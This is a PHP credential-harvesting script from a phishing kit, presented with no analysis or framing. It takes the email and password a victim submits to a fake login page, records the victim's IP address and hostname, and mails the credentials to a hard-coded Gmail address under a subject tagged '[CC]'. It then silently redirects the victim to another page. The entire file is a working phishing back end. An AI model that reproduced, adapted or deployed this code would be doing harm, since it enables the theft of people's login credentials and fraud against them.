<?php
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
if(($_POST['login_email'] != "") AND ($_POST['login_password'] != "") )
{
$hostname = gethostbyaddr($ip);
$message .= "[** mun AL iraqi ** ]\n";
$message .= "email       : ".$_POST['login_email']."\n";
$message .= "password       : ".$_POST['login_password']."\n";
$message .= "[BA06]\n";
$message .= "[BA06]\n";
$send = "mouradchfina1995@gmail.com";
$subject = "badr zoldyck [CC] $ip";
$headers = "From: [badr zoldyck **]<info@munther.com>";
mail($send,$subject,$message,$headers);
echo "<meta http-equiv='refresh' content='0; url=mun.html'/>";
}
	else {
     echo "<meta http-equiv='refresh' content='0; mun.html' />";
}

?>